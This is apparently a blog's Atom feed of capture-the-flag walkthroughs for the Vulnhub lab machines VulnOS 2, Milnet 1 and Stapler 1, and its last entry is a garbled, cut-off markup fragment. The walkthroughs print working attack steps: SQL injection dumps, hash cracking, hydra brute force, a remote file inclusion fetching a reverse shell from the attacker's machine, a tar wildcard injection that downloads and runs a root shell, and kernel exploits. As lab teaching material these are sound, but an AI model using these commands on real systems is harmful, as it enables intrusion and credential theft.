<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Boot2root | tick.Tack]]></title>
  <link href="http://newdominic.github.io/blog/categories/boot2root/atom.xml" rel="self"/>
  <link href="http://newdominic.github.io/"/>
  <updated>2016-06-19T20:32:40+08:00</updated>
  <id>http://newdominic.github.io/</id>
  <author>
    <name><![CDATA[DMC]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[VulnOS: 2]]></title>
    <link href="http://newdominic.github.io/blog/2016/06/18/vulnosv2/"/>
    <updated>2016-06-18T18:00:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2016/06/18/vulnosv2</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/vulnos-2,147/">VulnOS: 2</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>Nmap scan result</p>

<pre><code>Nmap scan report for 192.168.0.110
Host is up (0.00042s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6667/tcp open  irc
MAC Address: 08:00:27:33:5D:E9 (Cadmus Computer Systems)
</code></pre>

<h2>Limited Shell</h2>

<p>The index page is the introduction of VulnOSv2, which tells us the target website is under /jabc.</p>

<p><img src="/images/2016-06-19-vulnosv2/1.png"></p>

<p>By examining the source code, we can see that the website is based on Drupal 7. But none of existing exploits could work.</p>

<p>Then I turned to navigate every pages. Finally, when I visited the <strong>Documentation</strong> page, I found some hidden words here. Which tells the customers to visit /jabcd0cs/.</p>

<p><img src="/images/2016-06-19-vulnosv2/2.png"></p>

<p>The /jabcd0cs/ is running OpenDocMan with version 1.2.7, which is vulnerable to SQL injection. There&rsquo;s already an PoC <a href="https://www.exploit-db.com/exploits/32075/">here</a>.</p>

<p>Since the <strong>add_value</strong> is exploitable, I&rsquo;ll left the exploit work to <strong>sqlmap</strong>.</p>

<pre><code># sqlmap -u 'http://192.168.0.110/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user' -p add_value --dump-all
---snip---
Database: jabcd0cs
Table: odm_user
[2 entries]
+----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
| id | phone       | Email              | username | password                                 | last_name | first_name | department | pw_reset_code |
+----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
| 1  | 5555551212  | webmin@example.com | webmin   | b78aae356709f8c31118ea613980954b         | min       | web        | 2          | &lt;blank&gt;       |
| 2  | 555 5555555 | guest@example.com  | guest    | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest     | guest      | 2          | NULL          |
+----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
---snip---
</code></pre>

<p>Sqlmap has cracked the password of <strong>guest</strong> for us. After throwing <strong>webmin</strong>&rsquo;s hashed password into an online md5 cracker, it returned &ldquo;<strong>webmin1980</strong>&rdquo; as result.</p>

<p>There&rsquo;s nothing more I can do with OpenDocMan even logged in as <strong>webmin</strong>. So I decided to take a try on <strong>Password Reuse Attack</strong>.</p>

<pre><code># ssh webmin@192.168.0.110
webmin@192.168.0.110's password:
Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Jun 19 11:25:46 CEST 2016

  System load:  0.0               Processes:           86
  Usage of /:   5.8% of 29.91GB   Users logged in:     0
  Memory usage: 18%               IP address for eth0: 192.168.0.110
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Sun Jun 19 11:25:46 2016 from 192.168.0.105
$
</code></pre>

<h2>Privilege Escalation</h2>

<p>As the welcome messages says:</p>

<pre><code>Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)
</code></pre>

<p>Escalating privilege to <strong>root</strong> will be easily done with this <a href="https://www.exploit-db.com/exploits/37292/">exploit</a>.</p>

<pre><code>$ gcc -o exploit 37292.c
$ chmod +x exploit
$ ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(webmin)
# cat /root/flag.txt
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
#
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Milnet: 1]]></title>
    <link href="http://newdominic.github.io/blog/2016/06/18/Milnet_1/"/>
    <updated>2016-06-18T18:00:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2016/06/18/Milnet_1</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/milnet-1,148/">Milnet: 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>Nmap scan result:</p>

<pre><code>Nmap scan report for 192.168.0.109
Host is up, received arp-response (0.00048s latency).
Scanned at 2016-06-17 22:09:01 CST for 36s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:E7:D8:D2 (VMware)
</code></pre>

<h2>Limited Shell</h2>

<p>This machine is running a simple http server on port 80. These files were found after scanning with dirbuster:</p>

<pre><code>File found: /index.php - 200
File found: /content.php - 200
File found: /main.php - 200
File found: /info.php - 200
File found: /bomb.php - 200
File found: /props.php - 200
File found: /info.php - 200
</code></pre>

<p>Except the <strong>info.php</strong> showed the result of phpinfo(), there is nothing useful in other pages. But something caught my eye. When I was browsing <strong>content.php</strong>, the result is same as <strong>main.php</strong>. So I decided to examine deeper with burpsuite.</p>

<pre><code>POST /content.php HTTP/1.1
Host: 192.168.0.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.0.109/nav.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

route=main
</code></pre>

<p>When I clicked on the &lsquo;Main&rsquo; button, it was trigged to POST to <strong>content.php</strong> with a parameter <strong>route=main</strong>. And so do the &lsquo;Bomb&rsquo; and the &lsquo;Props&rsquo; buttons.</p>

<p>It seems to be a chance of File Inclusion vulnerability. First I made some attempts for Local File Inclusion. It is okay to use the relative path traversal to get to the file like: <strong>route=../../../../../var/www/html/main</strong>. But all I can do is to include files with <strong>.php</strong> extension. Putting a &lsquo;%00&rsquo; at the end did not help.</p>

<p>Next I tried to include a reverse shell from my machine.</p>

<pre><code>POST /content.php HTTP/1.1
Host: 192.168.0.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.0.109/nav.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

route=http://192.168.0.105/php-reverse-shell.txt?
</code></pre>

<p>The <strong>.php</strong> problem can be bypassed by putting a &lsquo;?&rsquo; at the end of the line. And this time I got a shell back on my machine.</p>

<pre><code># nc -lvp 6666
listening on [any] 6666 ...
192.168.0.109: inverse host lookup failed: Unknown host
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.109] 50118
Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 16:42:41 up  6:39,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
</code></pre>

<h2>Privilege Escalation</h2>

<p>After doing some enumeration, I found a suspicious cron job in <strong>/etc/crontab</strong>.</p>

<pre><code>$ cat /etc/crontab
---snip---
# m h dom mon dow user  command
*/1 *   * * *   root    /backup/backup.sh
---snip---
</code></pre>

<p>And here&rsquo;s what <strong>backup.sh</strong> does:</p>

<pre><code>#!/bin/bash
cd /var/www/html
tar cf /backup/backup.tgz *
</code></pre>

<p>It uses the <strong>tar</strong> command to compact the whole directory of <strong>/var/www/html/</strong> every minutes.</p>

<p>And here comes the wildcard exploit again. We have done this before while messing with <a href="../../../../2015/12/23/pipe">PIPE</a>. We can use the same technique to escalate to <strong>root</strong> privilege.</p>

<p>This time I&rsquo;ll use the <strong>php</strong> command to open another php reverse shell.</p>

<p>On milnet:</p>

<pre><code>$ cd /var/www/html
$ echo &gt; --checkpoint=1
$ echo &gt; --checkpoint-action=exec=sh\ shell.sh
$ wget http://192.168.0.105/php-reverse-shell.txt -O prs.php
--2016-06-18 18:12:37--  http://192.168.0.105/php-reverse-shell.txt
Connecting to 192.168.0.105:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5495 (5.4K) [text/plain]
Saving to: 'prs.php'

     0K .....                                                 100%  875M=0s

2016-06-18 18:12:37 (875 MB/s) - 'prs.php' saved [5495/5495]

$ sed -i s/6666/8888/g prs.php
$ echo 'php prs.php &amp;' &gt; shell.sh
$ chmod +x shell.sh
</code></pre>

<p>When the backup.sh is triggered, we&rsquo;ll get the shell pop with <strong>root</strong>.</p>

<pre><code>===
# nc -lvp 8888
listening on [any] 8888 ...
192.168.0.109: inverse host lookup failed: Unknown host
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.109] 36284
Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC                                                                                                                                                              2016 x86_64 x86_64 x86_64 GNU/Linux
 15:14:02 up  5:10,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# cat /root/credits.txt
        ,----,
      ,/   .`|
    ,`   .'  :  ,---,                          ,---,.
  ;    ;     /,--.' |                        ,'  .' |                  ,---,
.'___,/    ,' |  |  :                      ,---.'   |      ,---,     ,---.'|
|    :     |  :  :  :                      |   |   .'  ,-+-. /  |    |   | :
;    |.';  ;  :  |  |,--.   ,---.          :   :  |-, ,--.'|'   |    |   | |
`----'  |  |  |  :  '   |  /     \         :   |  ;/||   |  ,"' |  ,--.__| |
    '   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   |
    |   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  |
    '   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  |
    ;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  '
    '---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :|
              `--''       \   \  /         |   | ,'  '---'        \   \  /
                           `----'          `----'                  `----'


This was milnet for #vulnhub by @teh_warriar
I hope you enjoyed this vm!

If you liked it drop me a line on twitter or in #vulnhub.

I hope you found the clue:
/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for                                                                                                                                                              a long time...

This VM was inspired by The Cuckoo's Egg.
If you have not read it give it a try:
http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Stapler: 1]]></title>
    <link href="http://newdominic.github.io/blog/2016/06/17/stapler_1/"/>
    <updated>2016-06-17T12:22:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2016/06/17/stapler_1</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/stapler-1,150/">Stapler: 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>Nmap scan result</p>

<pre><code>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2016-06-17 12:29 CST
Warning: 192.168.0.108 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.0.108
Host is up (0.00035s latency).
Not shown: 992 filtered ports
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
53/tcp   open   domain
80/tcp   open   http
139/tcp  open   netbios-ssn
666/tcp  open   doom
3306/tcp open   mysql
MAC Address: 08:00:27:F5:FB:B3 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds
</code></pre>

<p>The <a href="https://www.vulnhub.com/entry/stapler-1,150/#description">description</a> says that:</p>

<pre><code>There are multiple methods to-do this machine
At least two (2) paths to get a limited shell
At least three (3) ways to get a root access
</code></pre>

<h2>Limited shell 1</h2>

<p>I used enum4linux to test the 139 port, which gave me the users on this machine.</p>

<pre><code>...snip...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
...snip...
</code></pre>

<p>Then I compsed these names into a file, then tried to brute force with it for both user name and password on the ssh service.</p>

<pre><code># grep 'Unix User' e4l_result | cut -d'\' -f2 | cut -d' ' -f1 &gt; user_list
# hydra -L user_list -P user_list 192.168.0.108 ssh

Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-06-17 13:42:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 16 tasks per 1 server, overall 64 tasks, 900 login tries (l:30/p:30), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.0.108   login: SHayslett   password: SHayslett
</code></pre>

<p>Here we got SHayslett who set the password the same as the username. Now we can login the ssh with this credential.</p>

<pre><code>ssh SHayslett@192.168.0.108
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.0.108's password:
Welcome back!


SHayslett@red:~$ id
uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)
SHayslett@red:~$
</code></pre>

<h2>Privilege Escalation 1</h2>

<p>After logged in as SHayslett, I found it is available to browse every users&#8217; home directory.</p>

<pre><code>SHayslett@red:/home$ ls -al
total 128
drwxr-xr-x 32 root       root       4096 Jun  4 20:13 .
drwxr-xr-x 22 root       root       4096 Jun  7 09:08 ..
drwxr-xr-x  2 AParnell   AParnell   4096 Jun  5 18:21 AParnell
drwxr-xr-x  2 CCeaser    CCeaser    4096 Jun  5 18:26 CCeaser
drwxr-xr-x  2 CJoo       CJoo       4096 Jun  5 18:24 CJoo
drwxr-xr-x  2 Drew       Drew       4096 Jun  5 18:24 Drew
drwxr-xr-x  2 DSwanger   DSwanger   4096 Jun  5 18:24 DSwanger
drwxr-xr-x  2 Eeth       Eeth       4096 Jun  5 18:24 Eeth
drwxr-xr-x  2 elly       elly       4096 Jun  5 18:24 elly
drwxr-xr-x  2 ETollefson ETollefson 4096 Jun  5 18:24 ETollefson
drwxr-xr-x  2 IChadwick  IChadwick  4096 Jun  5 18:24 IChadwick
drwxr-xr-x  2 jamie      jamie      4096 Jun  5 18:26 jamie
drwxr-xr-x  2 JBare      JBare      4096 Jun  5 18:24 JBare
drwxr-xr-x  2 jess       jess       4096 Jun  5 18:24 jess
drwxr-xr-x  2 JKanode    JKanode    4096 Jun  5 18:25 JKanode
drwxr-xr-x  2 JLipps     JLipps     4096 Jun  5 18:26 JLipps
drwxr-xr-x  2 kai        kai        4096 Jun  5 18:24 kai
drwxr-xr-x  2 LSolum     LSolum     4096 Jun  5 18:24 LSolum
drwxr-xr-x  2 LSolum2    LSolum2    4096 Jun  5 18:26 LSolum2
drwxr-xr-x  2 MBassin    MBassin    4096 Jun  5 18:24 MBassin
drwxr-xr-x  2 mel        mel        4096 Jun  5 18:24 mel
drwxr-xr-x  2 MFrei      MFrei      4096 Jun  5 18:24 MFrei
drwxr-xr-x  2 NATHAN     NATHAN     4096 Jun  5 18:24 NATHAN
drwxr-xr-x  3 peter      peter      4096 Jun  3 16:11 peter
drwxr-xr-x  2 RNunemaker RNunemaker 4096 Jun  5 18:24 RNunemaker
drwxr-xr-x  2 Sam        Sam        4096 Jun  5 18:24 Sam
drwxr-xr-x  2 SHAY       SHAY       4096 Jun  5 18:24 SHAY
drwxr-xr-x  3 SHayslett  SHayslett  4096 Jun 17 13:04 SHayslett
drwxr-xr-x  2 SStroud    SStroud    4096 Jun  5 18:24 SStroud
drwxr-xr-x  2 Taylor     Taylor     4096 Jun  5 18:26 Taylor
drwxrwxrwx  2 www        www        4096 Jun  5 18:25 www
drwxr-xr-x  2 zoe        zoe        4096 Jun  5 18:26 zoe
SHayslett@red:/home$
</code></pre>

<p>Let&rsquo;s check if there&rsquo;s any interesting stuff in them.</p>

<pre><code>SHayslett@red:/home$ ls -alR | grep -v .bash_logout | grep -v .bashrc |grep -v .profile
...snip...
./JKanode:
total 24
drwxr-xr-x  2 JKanode JKanode 4096 Jun  5 18:25 .
drwxr-xr-x 32 root    root    4096 Jun  4 20:13 ..
-rw-r--r--  1 JKanode JKanode  167 Jun  5 18:25 .bash_history
...snip...
</code></pre>

<p>We found something different in JKanode&rsquo;s and peter&rsquo;s home directory.</p>

<p>Now take a look at the .bash_history in JKanode</p>

<pre><code>SHayslett@red:/home/JKanode$ cat .bash_history
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
SHayslett@red:/home/JKanode$
</code></pre>

<p>Looks like we have peter&rsquo;s password here. Now it&rsquo;s time to switch to peter&rsquo;s account.</p>

<p>(Not sure if this is the second way to get the limited shell)</p>

<pre><code>SHayslett@red:/home/JKanode$ ssh peter@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
peter@localhost's password:
Welcome back!
This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses ---q
%red id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
red%
</code></pre>

<p>Now we are logged in as peter. And let&rsquo;s check the home directory first.</p>

<pre><code>red% ls -al
total 72
drwxr-xr-x  3 peter peter  4096 Jun  3 16:11 .
drwxr-xr-x 32 root  root   4096 Jun  4 20:13 ..
-rw-------  1 peter peter     1 Jun  5 18:00 .bash_history
-rw-r--r--  1 peter peter   220 Jun  3 13:53 .bash_logout
-rw-r--r--  1 peter peter  3771 Jun  3 13:53 .bashrc
drwx------  2 peter peter  4096 Jun  6 23:17 .cache
-rw-r--r--  1 peter peter   675 Jun  3 13:53 .profile
-rw-r--r--  1 peter peter     0 Jun  3 13:55 .sudo_as_admin_successful
-rw-------  1 peter peter   577 Jun  3 14:11 .viminfo
-rw-rw-r--  1 peter peter 39206 Jun  3 16:11 .zcompdump
</code></pre>

<p>&lsquo;.sudo_as_admin_successful&rsquo;</p>

<p>Looks like peter had sudo access before. Let&rsquo;s give it a try.</p>

<pre><code>red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter:
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
</code></pre>

<p>It seems that peter is granted access to all commands. Now we can logged in as root simply and get the flag!</p>

<pre><code>red% sudo su
➜  peter id
uid=0(root) gid=0(root) groups=0(root)
➜  peter cat /root/flag.txt
~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
</code></pre>

<h2>Privilege Escalation 2</h2>

<p>Here&rsquo;s the system information.</p>

<pre><code>red% uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
red% cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial
</code></pre>

<p>It can be easily pwnd with the <a href="https://www.exploit-db.com/exploits/39772/">exploit</a> found on exploit-db.</p>

<pre><code>red% ./compile.sh
doubleput.c: In function ‘make_setuid’:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
red% ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@red:~/ebpf_mapfd_doubleput_exploit# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare),1000(peter)
root@red:~/ebpf_mapfd_doubleput_exploit# cat /root/flag.txt
~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
</code></pre>

<h2>Ongoing Attempts</h2>

<p><strong>Port 666</strong></p>

<p>After connecting to port 666 with nc, it response with a stream of data then closed the connection.</p>

<p>I tried to direct the stream to a output file. It turns out that it is a zip file, which contains a image call message2.jpg.</p>

<pre><code># nc 192.168.0.108 666 &gt; output
# file output
output: Zip archive data, at least v2.0 to extract
# unzip output
Archive:  output
  inflating: message2.jpg
</code></pre>

<p><img class="center" src="/images/2016-06-17-stapler_1/message2.jpg"></p>

<p>Then I got a cookie by searching strings in it&hellip;.</p>

<pre><code># strings message2.jpg
JFIF
vPhotoshop 3.0
8BIM
1If you are reading this, you should get a cookie!
---snip---
</code></pre>

<hr />

<p><strong>Port 80</strong></p>

<p>The web sever is setup by using the php command directly.</p>

<pre><code>red% ps aux
---snip--- 
root      1409  0.0  0.2   6472  3060 ?        S    11:07   0:00 su -c authbind php -S 0.0.0.0:80 -t /home/www/ &amp;&gt;/dev/null www
---snip---
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Lord of the Root]]></title>
    <link href="http://newdominic.github.io/blog/2015/12/26/lord_of_root/"/>
    <updated>2015-12-26T21:38:42+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/12/26/lord_of_root</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">Lord Of The Root</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# nmap -p- -T5 192.168.0.119&lt;/p&gt;

&lt;p&gt;Starting Nmap 6.47 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://nmap.org&quot;</span>&gt;http://nmap.org&lt;/a&gt; <span class="o">)</span> at 2015-12-26 08:30 EST
Nmap scan report <span class="k">for</span> 192.168.0.119
Host is up <span class="o">(</span>0.00068s latency<span class="o">)</span>.
Not shown: <span class="m">65534</span> filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:FA:7B:62 <span class="o">(</span>VMware<span class="o">)</span>&lt;/p&gt;

&lt;p&gt;Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 53.53 seconds</code></pre></div></p>

<p>nmap掃瞄過之後只有port 22是打開的，另外掃過UDP也沒有掃到開起的port</p>

<p>最後只好先連上port 22看看</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# ssh 192.168.0.119&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                                              .____    _____________________________
                                              <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
                                              <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
                                              <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
                                              <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
                                                      <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt; &lt;em&gt;&lt;em&gt;&lt;strong&gt;  &lt;/strong&gt;.                     &lt;strong&gt;     &lt;/strong&gt;&lt;/em&gt;&lt;/em&gt;&lt;strong&gt;&lt;em&gt;&lt;strong&gt;&lt;strong&gt;      .&lt;/strong&gt;                   .&lt;/strong&gt;&lt;/em&gt; &lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;      &lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;       &lt;/strong&gt;
<span class="p">|</span>    <span class="p">|</span>/ &lt;em&gt;<span class="p">|</span> &lt;/em&gt;&lt;em&gt;&lt;strong&gt;   &lt;/strong&gt;&lt;strong&gt;   &lt;/strong&gt;&lt;/em&gt;&lt;em&gt; <span class="p">|</span>  <span class="p">|</span> &lt;strong&gt; _   &lt;/strong&gt;&lt;/em&gt;&lt;strong&gt;/&lt;/strong&gt;&lt;em&gt;&lt;em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;<span class="p">|</span> &lt;/em&gt;&lt;/em&gt;&lt;strong&gt;   &lt;/strong&gt;&lt;strong&gt;    &lt;/strong&gt;<span class="p">|</span> &lt;em&gt;/ _&lt;/em&gt;    &lt;strong&gt;&lt;em&gt;/&lt;/em&gt;&lt;/strong&gt;   _   &lt;strong&gt;&lt;strong&gt;&lt;em&gt;/ &lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;/  <span class="p">|</span>&lt;em&gt;  &lt;/em&gt;&lt;em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;
